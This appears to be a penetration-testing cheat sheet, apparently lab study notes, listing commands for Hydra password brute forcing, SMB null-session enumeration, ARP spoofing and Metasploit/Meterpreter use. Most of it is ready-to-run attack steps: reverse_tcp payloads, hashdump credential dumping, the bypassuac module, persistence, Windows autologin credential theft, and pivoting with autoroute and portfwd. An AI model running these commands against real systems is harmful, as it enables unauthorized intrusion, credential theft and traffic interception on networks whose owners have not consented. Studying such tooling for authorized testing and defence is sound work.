# Network Attacks 

### SSH Login
ssh usename@ipaddress 

### Seclists

[SecLists](https://github.com/danielmiessler/SecLists) is a great list containing common usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and more.

```
apt-get install seclists
```

### Hydra

Hydra is a fast, parallelized, network authentication cracker that supports different protocols.
```
hydra -L <users file> -P <password file> -t 10 <target> ssh -s 22
hydra -L <users file> -P <password file> telnet://<target>
```

### Windows Shares

NetBIOS can supply some of the following information when querying a computer:

- Hostname
- NetBIOS name
- Domain
- Network Shares

Badly configured shares exploitation can lead to:

- Information disclosure
- Unauthorized file access
- Information leakage used to mount a target attack

Null session attacks can be used to enumerate a lot of information. Attackers can steal information about:

- Passwords
- System users
- System Groups
- Running system processes
```
# Most common windows command to enumerate Windows shares
nbtstat -A <target>
```

```
# Once an attacker knows that a machine has the File Server service running, they can enumerate the shares using NET VIEW
NET VIEW <target>

# This tells Windows to connect to the IPC$ share by using an empty password and empty username
NET USE \\<target IP address>\IPC$ "" /u:''
```

```
# These commands can be used on a linux machine to enumerate network shares
nmblookup -A <target>

# Smbclient can do the same as NET VIEW but it also displays administrative shares that are hidden when using Windows standard tools
smbclient -L //<target> -N (list shares without asking for password)
<00> = wORKSTARION
<20> = File sharing service is up and running
UNIQUE = ONLY ONE ip

smbclient //<target>/share -N (mount share)
smbclient //ip/share -U %PASS (Connect to the share)
smb: \> get nameofthefile.txt (Download files )


# enum4linux is very powerful PERL script that can be used to enumerate Windows shares
enum4linux -a <target> ()
enum4linux -U <target> (Enumerate users)
enum4linux -s ~/Desktop/wordlists/100-common-passwords.txt demo.ine.local (bruteforce the share names using the specified wordlist)

# SMBMAP
NOTE: SMBMAP DOES NOT SHOW ALL THE USERS. USE enumb4linux to find the hidden users
smbmap -H IP
smbmap -R SHARE -H IP -A NAMEOFTHEFILE (Download files from a share)

# CRACKMAPEXEC (Use this instead of enumforlinux)
crackmapexec -h

Look at different permissions
crackmapexec smb IP --shares

# Null Attack (Establish a connection to IPC$ share without user and password.)
Only works on IPC$ 


```
By default enum4linux performs:

- User enumeration
- Share enumeration
- Group and member enumeration
- Password policy extraction
- OS information detection
- A nmblookup run
- Printer information extraction

### SMB Enumeration Checklist
What is SMB?
communication protocol that Microsoft created for providing shared access to files and printers across nodes on a network.

Port: 445, 139
https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html


### ARP Poisoning/Spoofing (Dsniff)

ARP Poisoning is a powerful attack you can use to intercept traffic on a switched network.

```
# tells my machine to forward packets intercepted to the real destination hosts
echo 1 > /proc/sys/net/ipv4/ip_forward

# arpspoof -i <interface> -t <target> -r <host>
arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11

# Example: to intercept traffic between 192.168.1.5 and 192.168.1.6 
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.5 -r 192.168.1.6
# Then run Wireshark and intercept the traffic
```

### Metasploit

Metasploit is an open-source framework used for penetration testing and exploit development.

Metasploit gives you a wide array of commuunity contributed exploits and attack vectors that can be used against various systems and technoologies.

Basic workflow to exploit a target using MSFConsole:

- Identifying a vulnerable service
- Searching for a proper exploit for that service
- Loading and configuring the exploit
- Loading and configuring the payload you want to use
- Running the exploit code and getting access to the vulnerable machine

```
Update MSF
apt  update ; apt install metasploit-framework

# Start MSF SQL dATABASE
service postgresql start



# Starts up metasploit console
msfconsole

# Search all modules by term
search <search term>



# Setting which module to use
use /path/to/exploit

# Info about the exploit/module
show info

# Once a module is being used to show all options to configure
show options

# Use set command and name of setting to configure all settings
set payload /path/to/payload
set RHOST <remote host>
set RPORT <remote port>

# To run/exploit module
run
exploit

```

Payloads are pieces of code injected by an exploit module into the victim machine or service.

A payload is used by an attacker to get:

- An OS Shell
- A VNC or RDP connection
- A Meterpreter shell
- The execution of an attacker-supplied application

### Meterpreter

NOTE: Always use a http:// when adding a url in the exploit options

Meterpreter is a very powerful shell which runs on Android, BSD, Java, Linux, PHP, Python, and Windows vulnerable applications and services.

Meterpreter is more than a simple shell. It provides advanced features to gather information, transfer files between the attacker and victim machines, install backdoors and more.

Meterpreter lets you perform information gathering on the exploited machine and the network it is attached to. You can retrieve:

- Information about the machine and the OS
- The network configuration in use
- The routing table of the compromised host
- Information about the user running the exploited process

```
# You can set your payload to be a meterpreter shell before running it
set payload <windows, linux, java etc>/meterpreter/reverse_tcp

# Once you have a meterpreter session open you can background it or use Ctrl+z
background

# Use the sessions command to see all current running sessions
sessions
sessions -l

# Use the -i flag and the sessions number to interact with it
sessions -i 1

# Useful information gathering commands once in meterpreter shell
sysinfo
ifconfig
route
getuid
getsystem

# The hashdump module dumps the password database of a Windows machine
use post/windows/gather/hashdump
set session 1
run

# bypassuac is a module you can use to bypass uac control on a windows machine
use exploit/windows/local/bypassuac
show options
set session 1
exploit
getuid (now having administrative privileges)

# The shell command gives you a standard OS shell
shell

# Meterpreter Persistance
Help option
run persistence -h

run persistence -A -L c:\\ -X -i 10 -p 443 -r target_ip 

# Before extracting auto login creds we have to migrate meterpreter to a process
migrate -N explorer.exe


Extract auto login creds
meterpreter > run post/windows/gather/credentials/windows_autologin
OR 
msf > use post/windows/gather/credentials/windows_autologin
msf post(windows_autologin) > show options
    ... show and set options ...
msf post(windows_autologin) > set SESSION session-id
msf post(windows_autologin) > exploit

"autoroute" command to add route to unreachable IP range.

autoroute

This command is used to add meterpreter session specific routes to the Metasploit's routing table. These routes can be used to pivot to the otherwise unreachanble network.

run autoroute -h
run autoroute -s 192.69.228.0 -n 255.255.255.0 (Adding the unreachalbe route)

Background the meterpreter session and check if the route is added successfully to the metasploit's routing table.

background
route print

We could use the "route" command to add the routing table to the metasploit framework
route add 192.69.228.0 255.255.255.0 1 (Syntax: route add subnet netmask sid)

run auxiliary TCP port scanning module to discover any available hosts (From IP .3 to .10). And, if any of ports 80, 8080, 445, 21 and 22 are open on those hosts.

use auxiliary/scanner/portscan/tcp
set PORTS 80, 8080, 445, 21, 22
set RHOSTS 192.69.228.3-10
exploit


We have discovered one host i.e. 192.69.228.3. Ports 21 (FTP) and 22 (SSH) are open on this host.

Step 14: In the meterpreter session there is an utility "portfwd" which allows forwarding remote machine port to the local machine port. We want to target port 21 of that machine so we will forward remote port 21 to the local port 1234.

Interact with the meterpreter session and forward the remote port to local machine.

Check portfwd meterpreter command help option.

Command

session -i 1
portfwd -h

Forwarding the remote port to local port

Command

portfwd add -l 1234 -p 21 -r 192.69.228.3 (-l local -p remote port -r remote host)
portfwd list


Step 15: Running nmap on the forwarded local port to identify the service name.

Command

background
nmap -sS -sV -p 1234 localhost

```


# Command getsystem 
is a meterpreter command for privilege escalation. It uses pre-defined methods to gain the highest privilege (i.e. SYSTEM) on the compromised machine.

0 : All techniques available

1 : Named Pipe Impersonation (In Memory/Admin)

2 : Named Pipe Impersonation (Dropper/Admin)

3 : Token Duplication (In Memory/Admin)

4 : Named Pipe Impersonation (RPCSS variant)

### CURL

### FTP
Login into FTP using IP address
ftp IP_ADDRESS

Login into FTP using domain name
ftp --passive DOMAIN_NAME

Upload a file to FTP server
put SHELL.TXT

Download a file from FTP server
mget *

Upload a file from FTP server terminal
mput LOCAL_FILE_NAME

From the FTP server terminal, check the local working directory
lpwd

From the FTP server terminal,check the local working directory
!ls

From the FTP server terminal, change the working direcorty
lcd

Off interactive mode in FTP
prompt
